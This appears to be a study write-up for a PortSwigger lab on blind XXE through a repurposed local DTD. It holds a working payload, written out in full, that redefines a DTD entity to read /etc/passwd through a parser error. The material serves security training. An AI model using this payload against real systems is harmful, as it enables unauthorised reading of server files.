# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

**Official lab:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)

**Lab idea:** This blind XXE challenge focuses on using a server-side DTD as part of an error-based disclosure scenario. It practices recognizing that parser errors can expose data even when the application does not display the normal result of XML parsing.

## Vulnerability in brief
XML external entity (XXE) injection is a vulnerability in applications that process attacker-influenced XML. When an XML parser resolves externally defined entities, the application may be made to access local files or issue network requests using the server's own access and network position. Whether data is exposed directly depends on how the application handles parsed values and errors.

## Solution idea
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following parameter entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM…

## Payloads / key values
- `stockCheck`
- `<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>`
- `ISOamso`
- `/etc/passwd`

## Official source
- [PortSwigger Academy: Lab: Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)
